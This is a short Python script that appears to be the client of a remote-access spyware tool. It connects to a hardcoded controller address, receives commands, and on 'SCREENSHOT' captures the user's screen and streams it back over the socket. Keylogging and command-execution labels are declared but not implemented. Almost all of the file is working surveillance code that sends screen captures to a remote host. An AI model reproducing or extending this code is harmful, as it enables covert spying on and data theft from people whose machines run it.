import socket
from utils import *

SCREENSHOT = 'SCREENSHOT'
KEYLOG = 'KEYLOG'
COMMAND = 'COMMAND'

addr = ("192.168.0.185", 8000)
ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ss.connect(addr)
print('connected..')

while True:
    try:
        command = ss.recv(1024).decode()
        print("Received command:", command)
        if command == SCREENSHOT:
            bytecode = b''
            screenshot_data = save_screenshot()
            if not screenshot_data:
                break
            chunk_size = 1024
            step = 0
            while step * chunk_size < len(screenshot_data):
                start = step * chunk_size
                end = min(start + chunk_size, len(screenshot_data))
                chunk = screenshot_data[start:end]
                ss.sendall(chunk)
                step += 1
        else:
            quit()
    except socket.error:
        print("Error connecting to server")
        quit()




